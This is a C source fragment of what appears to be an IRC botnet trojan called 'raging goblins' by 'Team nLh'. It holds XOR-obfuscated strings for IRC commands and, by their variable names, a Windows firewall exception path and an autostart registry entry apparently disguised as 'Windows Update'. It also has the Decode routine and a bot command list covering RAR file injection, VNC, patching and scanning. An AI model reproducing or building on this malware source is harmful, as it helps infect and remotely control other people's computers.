/////////////////////////////////////
//    ENCODED SHIT DO NOT EDIT!    //
/////////////////////////////////////

char string_nick[] = "\xB8\xBF\xB5\xBD\x00";
char string_join[] = "\xBC\xB9\xBF\xB8\x00";
char string_part[] = "\xA6\xB7\xA4\xA2\x00";
char string_quit[] = "\xA7\xA3\xBF\xA2\x00";
char string_privmsg[] = "\xA6\xA4\xBF\xA0\xBB\xA5\xB1\x00";
char string_pass[] = "\xA6\xB7\xA5\xA5\x00";
char string_ping[] = "\xA6\xBF\xB8\xB1\x00";
char string_pong[] = "\xA6\xB9\xB8\xB1\x00";
char string_user[] = "\xA3\xA5\xB3\xA4\x00";
char string_mode[] = "\xBB\xB9\xB2\xB3\x00";
char string_firewall_location[] = "\xA5\xAF\xA5\xA2\xB3\xBB\xAA\xAA\xB5\x83\x84\x84\x93\x98\x82\xB5"
										   "\x99\x98\x82\x84\x99\x9A\xA5\x93\x82\xAA\xAA\xA5\x93\x84\x80\x9F"
										   "\x95\x93\x85\xAA\xAA\xA5\x9E\x97\x84\x93\x92\xB7\x95\x95\x93\x85"
										   "\x85\xAA\xAA\xA6\x97\x84\x97\x9B\x93\x82\x93\x84\x85\xAA\xAA\xB0"
										   "\x9F\x84\x93\x81\x97\x9A\x9A\xA6\x99\x9A\x9F\x95\x8F\xAA\xAA\xA5"
										   "\x82\x97\x98\x92\x97\x84\x92\xA6\x84\x99\x90\x9F\x9A\x93\xAA\xAA"
										   "\xB7\x83\x82\x9E\x99\x84\x9F\x8C\x93\x92\xB7\x86\x86\x9A\x9F\x95"
										   "\x97\x82\x9F\x99\x98\x85\xAA\xAA\xBA\x9F\x85\x82\x00";
char string_firewall_enabled[] = "\xCC\xDC\xCC\xB3\x98\x97\x94\x9A\x93\x92\xCC\x00";
char string_autostart_location[] = "\xA5\x99\x90\x82\x81\x97\x84\x93\xAA\xAA\xBB\x9F\x95\x84\x99\x85"
											"\x99\x90\x82\xAA\xAA\xA1\x9F\x98\x92\x99\x81\x85\xAA\xAA\xB5\x83"
											"\x84\x84\x93\x98\x82\xA0\x93\x84\x85\x9F\x99\x98\xAA\xAA\xA4\x83"
											"\x98\x00";
char string_autostart_description[] = "\xA1\x9F\x98\x92\x99\x81\x85\xD6\xA3\x86\x92\x97\x82\x93\x00";
char decode_key[] = "uizh2984";
BOOL decode_comp = TRUE;
char *Decode(char *s)
{
	unsigned int i, j;
	char *string;

	string = (char *) malloc (strlen(s)+1);

	strcpy(string, s);

	for (i = 0; i < strlen(string); i++)
	{
		for (j = 0; j < sizeof(decode_key); j++)
			string[i] ^= decode_key[j];

		if (decode_comp)
			string[i] = ~ string[i];
	}

	return string;
}
char string_botversion[] = "\2raging goblins\2(0.532alpha)+\2vnc\2 by Team nLh - \2KEEP IT TO YOURSELF\2";
char string_rarinject[] = "\2[rage:]\2 injecting ALL rar files";
char string_commands[] = "\2[rage commands]\2 ver \2-\2 commands \2-\2 inject \2-\2 disconnect \2-\2 reconnect \2-\2 reconnect.next \2-\2 nick \2-\2 restart \2-\2 vncstop \2-\2 patch \2-\2 stats \2-\2 part \2-\2 join \2-\2 scan";
